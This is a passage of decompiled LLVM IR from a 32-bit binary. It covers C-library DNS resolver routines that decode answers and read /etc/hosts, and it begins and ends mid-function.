  %v2_1000f548 = icmp sgt i32 %v2_1000f544, 3
  %v0_1000f550 = load i32, i32* @r30, align 4
  %v2_1000f550 = add i32 %v0_1000f550, %v2_1000f53c
  store i32 %v2_1000f550, i32* %r9.global-to-local, align 4
  br i1 %v2_1000f548, label %dec_label_pc_1000f560, label %dec_label_pc_1000f558

dec_label_pc_1000f558:                            ; preds = %dec_label_pc_1000f550
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f584

dec_label_pc_1000f560:                            ; preds = %dec_label_pc_1000f550
  %v0_1000f560 = load i32, i32* @r31, align 4
  %v1_1000f560 = add i32 %v0_1000f560, 6
  %v2_1000f560 = inttoptr i32 %v1_1000f560 to i8*
  %v3_1000f560 = load i8, i8* %v2_1000f560, align 1
  %v5_1000f564 = inttoptr i32 %v2_1000f550 to i8*
  store i8 %v3_1000f560, i8* %v5_1000f564, align 1
  %v0_1000f568 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000f568 = add i32 %v0_1000f568, 4
  store i32 %v1_1000f568, i32* %r3.global-to-local, align 4
  %v0_1000f56c = load i32, i32* @r31, align 4
  %v1_1000f56c = add i32 %v0_1000f56c, 4
  %v2_1000f56c = inttoptr i32 %v1_1000f56c to i32*
  %v3_1000f56c = load i32, i32* %v2_1000f56c, align 4
  %v1_1000f570 = trunc i32 %v3_1000f56c to i8
  %v2_1000f570 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000f570 = add i32 %v2_1000f570, 1
  %v4_1000f570 = inttoptr i32 %v3_1000f570 to i8*
  store i8 %v1_1000f570, i8* %v4_1000f570, align 1
  %v0_1000f574 = load i32, i32* @r31, align 4
  %v1_1000f574 = add i32 %v0_1000f574, 10
  %v2_1000f574 = inttoptr i32 %v1_1000f574 to i8*
  %v3_1000f574 = load i8, i8* %v2_1000f574, align 1
  %v2_1000f578 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000f578 = add i32 %v2_1000f578, 2
  %v4_1000f578 = inttoptr i32 %v3_1000f578 to i8*
  store i8 %v3_1000f574, i8* %v4_1000f578, align 1
  %v0_1000f57c = load i32, i32* @r31, align 4
  %v1_1000f57c = add i32 %v0_1000f57c, 8
  %v2_1000f57c = inttoptr i32 %v1_1000f57c to i32*
  %v3_1000f57c = load i32, i32* %v2_1000f57c, align 4
  %v1_1000f580 = trunc i32 %v3_1000f57c to i8
  %v2_1000f580 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000f580 = add i32 %v2_1000f580, 3
  %v4_1000f580 = inttoptr i32 %v3_1000f580 to i8*
  store i8 %v1_1000f580, i8* %v4_1000f580, align 1
  %v0_1000f594.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f584

dec_label_pc_1000f584:                            ; preds = %entry, %dec_label_pc_1000f558, %dec_label_pc_1000f560
  %v0_1000f594 = phi i32 [ %v2_1000f53c, %entry ], [ -1, %dec_label_pc_1000f558 ], [ %v0_1000f594.pre, %dec_label_pc_1000f560 ]
  ret i32 %v0_1000f594

; uselistorder directives
  uselistorder i32 %v2_1000f53c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_1000f584, { 2, 1, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268498344, i32* @lr, align 4
  %v0_1000f5a4 = call i32 @__length_dotted()
  %v1_1000f5a8 = icmp slt i32 %v0_1000f5a4, 0
  br i1 %v1_1000f5a8, label %dec_label_pc_1000f5b4, label %dec_label_pc_1000f5b0

dec_label_pc_1000f5b0:                            ; preds = %entry
  %v1_1000f5b0 = add i32 %v0_1000f5a4, 4
  br label %dec_label_pc_1000f5b4

dec_label_pc_1000f5b4:                            ; preds = %entry, %dec_label_pc_1000f5b0
  %v0_1000f5c0 = phi i32 [ %v0_1000f5a4, %entry ], [ %v1_1000f5b0, %dec_label_pc_1000f5b0 ]
  ret i32 %v0_1000f5c0

; uselistorder directives
  uselistorder label %dec_label_pc_1000f5b4, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-280 = alloca i32, align 4
  %v0_1000f5c8 = load i32, i32* @lr, align 4
  store i32 %v0_1000f5c8, i32* %r0.global-to-local, align 4
  %v2_1000f5d0 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_1000f5d0, i32* @r30, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 256, i32* @r6, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268498420, i32* @lr, align 4
  %v2_1000f5f0 = call i32 @__decode_dotted(i32 %v2_1000f5d0, i32 256)
  store i32 %v2_1000f5f0, i32* @r27, align 4
  %v1_1000f5f4 = icmp slt i32 %v2_1000f5f0, 0
  %v0_1000f5f8 = load i32, i32* @r28, align 4
  %v2_1000f5f8 = add i32 %v0_1000f5f8, %v2_1000f5f0
  store i32 %v2_1000f5f8, i32* @r28, align 4
  %v1_1000f5fc = load i32, i32* @r29, align 4
  %v2_1000f5fc = sub i32 %v1_1000f5fc, %v2_1000f5f8
  %v1_1000f600 = add i32 %v2_1000f5fc, -10
  br i1 %v1_1000f5f4, label %dec_label_pc_1000f6bc, label %dec_label_pc_1000f60c

dec_label_pc_1000f60c:                            ; preds = %entry
  %v0_1000f610 = load i32, i32* @r26, align 4
  %v2_1000f610 = add i32 %v0_1000f610, %v2_1000f5f8
  store i32 %v2_1000f610, i32* @r30, align 4
  %tmp6 = icmp sgt i32 %v1_1000f600, -1
  br i1 %tmp6, label %dec_label_pc_1000f620, label %dec_label_pc_1000f618

dec_label_pc_1000f618:                            ; preds = %dec_label_pc_1000f60c
  store i32 %v1_1000f600, i32* @r27, align 4
  br label %dec_label_pc_1000f6bc

dec_label_pc_1000f620:                            ; preds = %dec_label_pc_1000f60c
  store i32 268498468, i32* @lr, align 4
  %v1_1000f620 = call i32 @__GI_strdup(i32 %v2_1000f5d0)
  %v0_1000f624 = load i32, i32* @r30, align 4
  %v1_1000f624 = add i32 %v0_1000f624, 2
  store i32 %v1_1000f624, i32* %r8.global-to-local, align 4
  %v1_1000f628 = load i32, i32* @r31, align 4
  %v2_1000f628 = inttoptr i32 %v1_1000f628 to i32*
  store i32 %v1_1000f620, i32* %v2_1000f628, align 4
  %v0_1000f62c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f62c = add i32 %v0_1000f62c, 2
  store i32 %v1_1000f62c, i32* %r10.global-to-local, align 4
  %v0_1000f630 = load i32, i32* @r30, align 4
  %v1_1000f630 = add i32 %v0_1000f630, 10
  store i32 %v1_1000f630, i32* %r6.global-to-local, align 4
  %v0_1000f634 = load i32, i32* @r26, align 4
  %v1_1000f634 = load i32, i32* @r28, align 4
  %v2_1000f634 = add i32 %v1_1000f634, %v0_1000f634
  %v3_1000f634 = inttoptr i32 %v2_1000f634 to i8*
  %v4_1000f634 = load i8, i8* %v3_1000f634, align 1
  %v5_1000f634 = zext i8 %v4_1000f634 to i32
  store i32 %v5_1000f634, i32* %r0.global-to-local, align 4
  %v1_1000f638 = add i32 %v0_1000f630, 1
  %v2_1000f638 = inttoptr i32 %v1_1000f638 to i8*
  %v3_1000f638 = load i8, i8* %v2_1000f638, align 1
  %v4_1000f638 = zext i8 %v3_1000f638 to i32
  store i32 %v4_1000f638, i32* %r9.global-to-local, align 4
  %v1_1000f63c = mul nuw nsw i32 %v5_1000f634, 256
  %v2_1000f640 = or i32 %v4_1000f638, %v1_1000f63c
  store i32 %v2_1000f640, i32* %r0.global-to-local, align 4
  %v1_1000f644 = load i32, i32* @r31, align 4
  %v2_1000f644 = add i32 %v1_1000f644, 4
  %v3_1000f644 = inttoptr i32 %v2_1000f644 to i32*
  store i32 %v2_1000f640, i32* %v3_1000f644, align 4
  %v0_1000f648 = load i32, i32* @r30, align 4
  %v1_1000f648 = add i32 %v0_1000f648, 2
  %v2_1000f648 = inttoptr i32 %v1_1000f648 to i8*
  %v3_1000f648 = load i8, i8* %v2_1000f648, align 1
  %v4_1000f648 = zext i8 %v3_1000f648 to i32
  store i32 %v4_1000f648, i32* %r0.global-to-local, align 4
  %v0_1000f64c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f64c = add i32 %v0_1000f64c, 1
  %v2_1000f64c = inttoptr i32 %v1_1000f64c to i8*
  %v3_1000f64c = load i8, i8* %v2_1000f64c, align 1
  %v4_1000f64c = zext i8 %v3_1000f64c to i32
  store i32 %v4_1000f64c, i32* %r9.global-to-local, align 4
  %v1_1000f650 = mul nuw nsw i32 %v4_1000f648, 256
  %v2_1000f654 = or i32 %v4_1000f64c, %v1_1000f650
  store i32 %v2_1000f654, i32* %r0.global-to-local, align 4
  %v1_1000f658 = load i32, i32* @r31, align 4
  %v2_1000f658 = add i32 %v1_1000f658, 8
  %v3_1000f658 = inttoptr i32 %v2_1000f658 to i32*
  store i32 %v2_1000f654, i32* %v3_1000f658, align 4
  %v0_1000f65c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f65c = add i32 %v0_1000f65c, 2
  %v2_1000f65c = inttoptr i32 %v1_1000f65c to i8*
  %v3_1000f65c = load i8, i8* %v2_1000f65c, align 1
  %v4_1000f65c = zext i8 %v3_1000f65c to i32
  store i32 %v4_1000f65c, i32* %r0.global-to-local, align 4
  %v0_1000f660 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000f660 = add i32 %v0_1000f660, 1
  %v2_1000f660 = inttoptr i32 %v1_1000f660 to i8*
  %v3_1000f660 = load i8, i8* %v2_1000f660, align 1
  %v4_1000f660 = zext i8 %v3_1000f660 to i32
  store i32 %v4_1000f660, i32* %r11.global-to-local, align 4
  %v1_1000f664 = add i32 %v0_1000f660, 3
  %v2_1000f664 = inttoptr i32 %v1_1000f664 to i8*
  %v3_1000f664 = load i8, i8* %v2_1000f664, align 1
  %v4_1000f664 = zext i8 %v3_1000f664 to i32
  %v1_1000f668 = mul nuw i32 %v4_1000f65c, 16777216
  store i32 %v1_1000f668, i32* %r0.global-to-local, align 4
  %v1_1000f66c = add i32 %v0_1000f660, 2
  %v2_1000f66c = inttoptr i32 %v1_1000f66c to i8*
  %v3_1000f66c = load i8, i8* %v2_1000f66c, align 1
  %v4_1000f66c = zext i8 %v3_1000f66c to i32
  %v1_1000f670 = mul nuw nsw i32 %v4_1000f660, 65536
  %v2_1000f674 = or i32 %v1_1000f670, %v1_1000f668
  %v0_1000f678 = load i32, i32* @r28, align 4
  %v1_1000f678 = add i32 %v0_1000f678, 10
  store i32 %v1_1000f678, i32* %r11.global-to-local, align 4
  %v2_1000f67c = or i32 %v2_1000f674, %v4_1000f664
  store i32 %v2_1000f67c, i32* %r0.global-to-local, align 4
  %v1_1000f680 = mul nuw nsw i32 %v4_1000f66c, 256
  %v2_1000f684 = or i32 %v1_1000f680, %v2_1000f67c
  store i32 %v2_1000f684, i32* %r9.global-to-local, align 4
  %v1_1000f688 = load i32, i32* @r31, align 4
  %v2_1000f688 = add i32 %v1_1000f688, 12
  %v3_1000f688 = inttoptr i32 %v2_1000f688 to i32*
  store i32 %v2_1000f684, i32* %v3_1000f688, align 4
  %v0_1000f68c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f68c = add i32 %v0_1000f68c, 6
  %v2_1000f68c = inttoptr i32 %v1_1000f68c to i8*
  %v3_1000f68c = load i8, i8* %v2_1000f68c, align 1
  %v4_1000f68c = zext i8 %v3_1000f68c to i32
  store i32 %v4_1000f68c, i32* %r9.global-to-local, align 4
  %v0_1000f690 = load i32, i32* @r30, align 4
  %v1_1000f690 = add i32 %v0_1000f690, 9
  %v2_1000f690 = inttoptr i32 %v1_1000f690 to i8*
  %v3_1000f690 = load i8, i8* %v2_1000f690, align 1
  %v4_1000f690 = zext i8 %v3_1000f690 to i32
  store i32 %v4_1000f690, i32* %r0.global-to-local, align 4
  %v1_1000f694 = mul nuw nsw i32 %v4_1000f68c, 256
  store i32 %v1_1000f694, i32* %r9.global-to-local, align 4
  %v0_1000f698 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f698 = load i32, i32* @r31, align 4
  %v2_1000f698 = add i32 %v1_1000f698, 24
  %v3_1000f698 = inttoptr i32 %v2_1000f698 to i32*
  store i32 %v0_1000f698, i32* %v3_1000f698, align 4
  %v0_1000f69c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f69c = load i32, i32* %r0.global-to-local, align 4
  %v2_1000f69c = or i32 %v1_1000f69c, %v0_1000f69c
  store i32 %v2_1000f69c, i32* %r9.global-to-local, align 4
  %v0_1000f6a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000f6a0 = load i32, i32* @r31, align 4
  %v2_1000f6a0 = add i32 %v1_1000f6a0, 20
  %v3_1000f6a0 = inttoptr i32 %v2_1000f6a0 to i32*
  store i32 %v0_1000f6a0, i32* %v3_1000f6a0, align 4
  %v0_1000f6a4 = load i32, i32* @r29, align 4
  %v1_1000f6a4 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000f6a4 = icmp slt i32 %v0_1000f6a4, %v1_1000f6a4
  %v1_1000f6a8 = add i32 %v1_1000f6a4, 10
  store i32 %v1_1000f6a8, i32* %r0.global-to-local, align 4
  %v0_1000f6ac = load i32, i32* @r27, align 4
  %v2_1000f6ac = add i32 %v0_1000f6ac, %v1_1000f6a8
  store i32 %v2_1000f6ac, i32* @r27, align 4
  %v1_1000f6b0 = load i32, i32* @r31, align 4
  %v2_1000f6b0 = add i32 %v1_1000f6b0, 16
  %v3_1000f6b0 = inttoptr i32 %v2_1000f6b0 to i32*
  store i32 %v1_1000f6a4, i32* %v3_1000f6b0, align 4
  br i1 %v2_1000f6a4, label %dec_label_pc_1000f6b8, label %dec_label_pc_1000f620.dec_label_pc_1000f6bc_crit_edge

dec_label_pc_1000f620.dec_label_pc_1000f6bc_crit_edge: ; preds = %dec_label_pc_1000f620
  %v0_1000f6c0.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000f6bc

dec_label_pc_1000f6b8:                            ; preds = %dec_label_pc_1000f620
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_1000f6bc

dec_label_pc_1000f6bc:                            ; preds = %dec_label_pc_1000f620.dec_label_pc_1000f6bc_crit_edge, %entry, %dec_label_pc_1000f618, %dec_label_pc_1000f6b8
  %v0_1000f6c0 = phi i32 [ %v0_1000f6c0.pre, %dec_label_pc_1000f620.dec_label_pc_1000f6bc_crit_edge ], [ %v2_1000f5f0, %entry ], [ %v1_1000f600, %dec_label_pc_1000f618 ], [ -1, %dec_label_pc_1000f6b8 ]
  store i32 %v0_1000f5c8, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000f6c0

; uselistorder directives
  uselistorder i32 %v1_1000f6a4, { 1, 0, 2 }
  uselistorder i32 %v1_1000f668, { 1, 0 }
  uselistorder i32 %v1_1000f600, { 1, 2, 0 }
  uselistorder i32 %v2_1000f5f0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000f5d0, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 0 }
  uselistorder i32 20, { 29, 30, 31, 32, 1, 14, 33, 34, 15, 16, 17, 18, 5, 6, 27, 7, 0, 38, 39, 19, 20, 21, 22, 23, 25, 26, 24, 37, 35, 8, 9, 10, 11, 12, 13, 4, 28, 2, 3, 36 }
  uselistorder i32 9, { 17, 18, 19, 20, 1, 8, 2, 9, 3, 10, 0, 11, 12, 13, 14, 15, 4, 5, 6, 7, 16, 21, 22 }
  uselistorder i32 65536, { 0, 34, 1, 2, 3, 4, 6, 5, 7, 8, 9, 37, 35, 10, 12, 11, 13, 36, 14, 16, 15, 17, 19, 18, 20, 21, 22, 25, 24, 23, 27, 28, 26, 29, 31, 32, 30, 33 }
  uselistorder i32 3, { 42, 43, 44, 45, 46, 47, 48, 49, 50, 1, 35, 2, 0, 8, 18, 20, 19, 10, 21, 52, 9, 57, 3, 53, 54, 36, 37, 22, 38, 39, 30, 32, 58, 59, 31, 62, 33, 14, 4, 5, 55, 60, 61, 6, 67, 68, 69, 63, 64, 65, 66, 12, 41, 40, 51, 7, 13, 34, 15, 23, 16, 24, 25, 56, 26, 27, 28, 17, 29, 11 }
  uselistorder i32 (i32)* @__GI_strdup, { 2, 1, 0 }
  uselistorder i32 -10, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 256, { 0, 1, 2, 3, 46, 52, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 44, 16, 17, 18, 19, 20, 21, 22, 23, 49, 24, 50, 51, 55, 25, 26, 27, 28, 29, 54, 47, 30, 31, 32, 33, 53, 34, 35, 36, 37, 38, 39, 40, 45, 48, 41, 42, 43 }
  uselistorder label %dec_label_pc_1000f6bc, { 3, 0, 2, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v0_1000f6d8 = load i32, i32* @lr, align 4
  store i32 268498684, i32* @lr, align 4
  %v3_1000f6f8 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_10013930.694 to i32), i32 ptrtoint (i32* @global_var_100138cc.664 to i32))
  %v3_1000f700 = icmp eq i32 %v3_1000f6f8, 0
  br i1 %v3_1000f700, label %dec_label_pc_1000f708, label %dec_label_pc_1000f724

dec_label_pc_1000f708:                            ; preds = %entry
  %v0_1000f6fc = load i32, i32* @r29, align 4
  store i32 %v0_1000f6d8, i32* @lr, align 4
  %v3_1000f720 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_1001393c.695 to i32), i32 %v0_1000f6fc)
  br label %dec_label_pc_1000f724

dec_label_pc_1000f724:                            ; preds = %entry, %dec_label_pc_1000f708
  %v0_1000f734 = phi i32 [ %v3_1000f6f8, %entry ], [ %v3_1000f720, %dec_label_pc_1000f708 ]
  ret i32 %v0_1000f734

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 6, 2, 1, 0, 5, 4, 3 }
  uselistorder label %dec_label_pc_1000f724, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg7, i32* %r9.global-to-local, align 4
  %tmp = ptrtoint i32* %arg5 to i32
  %v0_1000f738 = load i32, i32* @lr, align 4
  store i32 %arg6, i32* @r30, align 4
  %v1_1000f74c = sub i32 0, %arg6
  %v1_1000f750 = urem i32 %v1_1000f74c, 4
  store i32 %v1_1000f750, i32* %r0.global-to-local, align 4
  %v3_1000f750 = icmp eq i32 %v1_1000f750, 0
  store i32 %arg1, i32* @r20, align 4
  store i32 %arg2, i32* %r15.global-to-local, align 4
  store i32 %arg3, i32* %r19.global-to-local, align 4
  store i32 %arg4, i32* %r18.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v0_1000f768 = load i32, i32* @r10, align 4
  store i32 %v0_1000f768, i32* %r17.global-to-local, align 4
  store i32 %arg8, i32* %r16.global-to-local, align 4
  %v0_1000f784.pr = load i32, i32* %r9.global-to-local, align 4
  br i1 %v3_1000f750, label %dec_label_pc_1000f784, label %dec_label_pc_1000f774

dec_label_pc_1000f774:                            ; preds = %entry
  %v2_1000f774 = icmp ult i32 %v0_1000f784.pr, %v1_1000f750
  br i1 %v2_1000f774, label %dec_label_pc_1000fa38, label %dec_label_pc_1000f77c

dec_label_pc_1000f77c:                            ; preds = %dec_label_pc_1000f774
  %v2_1000f77c = sub i32 %v0_1000f784.pr, %v1_1000f750
  store i32 %v2_1000f77c, i32* %r9.global-to-local, align 4
  %v2_1000f780 = add i32 %v1_1000f750, %arg6
  store i32 %v2_1000f780, i32* @r30, align 4
  br label %dec_label_pc_1000f784

dec_label_pc_1000f784:                            ; preds = %entry, %dec_label_pc_1000f77c
  %v0_1000f790 = phi i32 [ %v2_1000f780, %dec_label_pc_1000f77c ], [ %arg6, %entry ]
  %v0_1000f794 = phi i32 [ %v2_1000f77c, %dec_label_pc_1000f77c ], [ %v0_1000f784.pr, %entry ]
  %tmp49 = icmp ult i32 %v0_1000f794, 32
  br i1 %tmp49, label %dec_label_pc_1000fa38, label %dec_label_pc_1000f78c

dec_label_pc_1000f78c:                            ; preds = %dec_label_pc_1000f784
  %v3_1000f78c = icmp eq i32 %arg4, 1
  %v1_1000f790 = add i32 %v0_1000f790, 32
  store i32 %v1_1000f790, i32* @r24, align 4
  %v1_1000f794 = add i32 %v0_1000f794, -32
  store i32 %v1_1000f794, i32* @r27, align 4
  br i1 %v3_1000f78c, label %dec_label_pc_1000f894, label %dec_label_pc_1000f79c

dec_label_pc_1000f79c:                            ; preds = %dec_label_pc_1000f78c
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1000f7a4 = inttoptr i32 %arg8 to i32*
  store i32 -1, i32* %v2_1000f7a4, align 4
  %tmp50 = icmp ult i32 %v1_1000f794, 4
  br i1 %tmp50, label %dec_label_pc_1000fa38, label %dec_label_pc_1000f7ac

dec_label_pc_1000f7ac:                            ; preds = %dec_label_pc_1000f79c
  %v0_1000f7ac = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f7ac = add i32 %v0_1000f7ac, -36
  store i32 %v1_1000f7ac, i32* %r0.global-to-local, align 4
  %tmp51 = icmp ult i32 %v1_1000f7ac, 8
  br i1 %tmp51, label %dec_label_pc_1000fa38, label %dec_label_pc_1000f7b8

dec_label_pc_1000f7b8:                            ; preds = %dec_label_pc_1000f7ac
  %v0_1000f7b8 = load i32, i32* @r27, align 4
  %tmp52 = icmp ult i32 %v0_1000f7b8, 16
  br i1 %tmp52, label %dec_label_pc_1000fa38, label %dec_label_pc_1000f7c0

dec_label_pc_1000f7c0:                            ; preds = %dec_label_pc_1000f7b8
  %v1_1000f7c0 = add i32 %v0_1000f7ac, -48
  store i32 %v1_1000f7c0, i32* %r0.global-to-local, align 4
  %tmp53 = icmp ult i32 %v1_1000f7c0, 8
  br i1 %tmp53, label %dec_label_pc_1000fa38, label %dec_label_pc_1000f7cc

dec_label_pc_1000f7cc:                            ; preds = %dec_label_pc_1000f7c0
  %v1_1000f7cc = add i32 %v0_1000f7ac, -56
  store i32 %v1_1000f7cc, i32* %r0.global-to-local, align 4
  %v1_1000f7d0 = add i32 %v0_1000f7ac, -44
  store i32 %v1_1000f7d0, i32* @r27, align 4
  %v3_1000f7d4 = icmp ugt i32 %v1_1000f7cc, %v1_1000f7d0
  %v0_1000f7d8 = load i32, i32* @r30, align 4
  %v1_1000f7d8 = add i32 %v0_1000f7d8, 36
  store i32 %v1_1000f7d8, i32* @r29, align 4
  %v1_1000f7dc = add i32 %v0_1000f7d8, 48
  store i32 %v1_1000f7dc, i32* @r26, align 4
  br i1 %v3_1000f7d4, label %dec_label_pc_1000f7f0, label %dec_label_pc_1000f7e8

dec_label_pc_1000f7e8:                            ; preds = %dec_label_pc_1000f7cc
  store i32 %v1_1000f7cc, i32* @r27, align 4
  br label %dec_label_pc_1000f7f0

dec_label_pc_1000f7f0:                            ; preds = %dec_label_pc_1000f7cc, %dec_label_pc_1000f7e8
  %v0_1000f7f0 = phi i32 [ %v1_1000f7cc, %dec_label_pc_1000f7e8 ], [ %v1_1000f7d0, %dec_label_pc_1000f7cc ]
  %tmp54 = icmp ult i32 %v0_1000f7f0, 80
  br i1 %tmp54, label %dec_label_pc_1000fa38, label %dec_label_pc_1000f7f8

dec_label_pc_1000f7f8:                            ; preds = %dec_label_pc_1000f7f0
  store i32 268498940, i32* @lr, align 4
  %v0_1000f7f8 = call i32 @__open_etc_hosts()
  store i32 %v0_1000f7f8, i32* @r20, align 4
  %v3_1000f7fc = icmp eq i32 %v0_1000f7f8, 0
  br i1 %v3_1000f7fc, label %dec_label_pc_1000f81c, label %dec_label_pc_1000f804

dec_label_pc_1000f804:                            ; preds = %dec_label_pc_1000f7f8
  %v0_1000f804 = load i32, i32* @r24, align 4
  store i32 %v0_1000f804, i32* @r25, align 4
  %v0_1000f80c = load i32, i32* @r26, align 4
  store i32 %v0_1000f80c, i32* @r23, align 4
  %v0_1000f810 = load i32, i32* @r31, align 4
  store i32 %v0_1000f810, i32* @r24, align 4
  store i32 %v0_1000f804, i32* %r21.global-to-local, align 4
  %v1_1000f8ac.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_1000f8a4

dec_label_pc_1000f81c:                            ; preds = %dec_label_pc_1000f7f8
  %v1_1000f81c = load i32, i32* %r17.global-to-local, align 4
  %v2_1000f81c = inttoptr i32 %v1_1000f81c to i32*
  store i32 0, i32* %v2_1000f81c, align 4
  %v0_1000f820 = call i32 @__errno_location()
  %v1_1000f824 = inttoptr i32 %v0_1000f820 to i32*
  %v2_1000f824 = load i32, i32* %v1_1000f824, align 4
  store i32 %v2_1000f824, i32* @r26, align 4
  br label %dec_label_pc_1000fa3c

dec_label_pc_1000f82c:                            ; preds = %dec_label_pc_1000f9cc
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000f830 = load i32, i32* @r25, align 4
  %v1_1000f830 = load i32, i32* @r22, align 4
  %v2_1000f830 = inttoptr i32 %v1_1000f830 to i32*
  store i32 %v0_1000f830, i32* %v2_1000f830, align 4
  %v0_1000f834 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f834 = load i32, i32* @r22, align 4
  %v2_1000f834 = add i32 %v1_1000f834, 4
  %v3_1000f834 = inttoptr i32 %v2_1000f834 to i32*
  store i32 %v0_1000f834, i32* %v3_1000f834, align 4
  %v0_1000f838 = load i32, i32* @r30, align 4
  %v1_1000f838 = add i32 %v0_1000f838, 8
  store i32 %v1_1000f838, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_1000f840 = add i32 %v0_1000f838, 4
  %v2_1000f840 = inttoptr i32 %v1_1000f840 to i32*
  %v3_1000f840 = load i32, i32* %v2_1000f840, align 4
  store i32 %v3_1000f840, i32* %r0.global-to-local, align 4
  %v0_1000f844 = load i32, i32* %r19.global-to-local, align 4
  %v1_1000f844 = load i32, i32* @r28, align 4
  %v2_1000f844 = add i32 %v1_1000f844, 8
  %v3_1000f844 = inttoptr i32 %v2_1000f844 to i32*
  store i32 %v0_1000f844, i32* %v3_1000f844, align 4
  %v0_1000f848 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f848 = load i32, i32* @r28, align 4
  %v2_1000f848 = inttoptr i32 %v1_1000f848 to i32*
  store i32 %v0_1000f848, i32* %v2_1000f848, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1000f850 = load i32, i32* @r28, align 4
  %v2_1000f850 = add i32 %v1_1000f850, 12
  %v3_1000f850 = inttoptr i32 %v2_1000f850 to i32*
  store i32 4, i32* %v3_1000f850, align 4
  %v0_1000f854 = load i32, i32* @r22, align 4
  %v1_1000f854 = load i32, i32* @r28, align 4
  %v2_1000f854 = add i32 %v1_1000f854, 16
  %v3_1000f854 = inttoptr i32 %v2_1000f854 to i32*
  store i32 %v0_1000f854, i32* %v3_1000f854, align 4
  br label %dec_label_pc_1000f888

dec_label_pc_1000f85c:                            ; preds = %dec_label_pc_1000f9f0
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000f860 = load i32, i32* %r21.global-to-local, align 4
  %v1_1000f860 = load i32, i32* @r23, align 4
  %v2_1000f860 = inttoptr i32 %v1_1000f860 to i32*
  store i32 %v0_1000f860, i32* %v2_1000f860, align 4
  %v0_1000f864 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f864 = load i32, i32* @r23, align 4
  %v2_1000f864 = add i32 %v1_1000f864, 4
  %v3_1000f864 = inttoptr i32 %v2_1000f864 to i32*
  store i32 %v0_1000f864, i32* %v3_1000f864, align 4
  %v0_1000f868 = load i32, i32* @r30, align 4
  %v1_1000f868 = add i32 %v0_1000f868, 8
  store i32 %v1_1000f868, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_1000f870 = add i32 %v0_1000f868, 4
  %v2_1000f870 = inttoptr i32 %v1_1000f870 to i32*
  %v3_1000f870 = load i32, i32* %v2_1000f870, align 4
  store i32 %v3_1000f870, i32* %r0.global-to-local, align 4
  %v0_1000f874 = load i32, i32* %r19.global-to-local, align 4
  %v1_1000f874 = load i32, i32* @r28, align 4
  %v2_1000f874 = add i32 %v1_1000f874, 8
  %v3_1000f874 = inttoptr i32 %v2_1000f874 to i32*
  store i32 %v0_1000f874, i32* %v3_1000f874, align 4
  %v0_1000f878 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f878 = load i32, i32* @r28, align 4
  %v2_1000f878 = inttoptr i32 %v1_1000f878 to i32*
  store i32 %v0_1000f878, i32* %v2_1000f878, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_1000f880 = load i32, i32* @r28, align 4
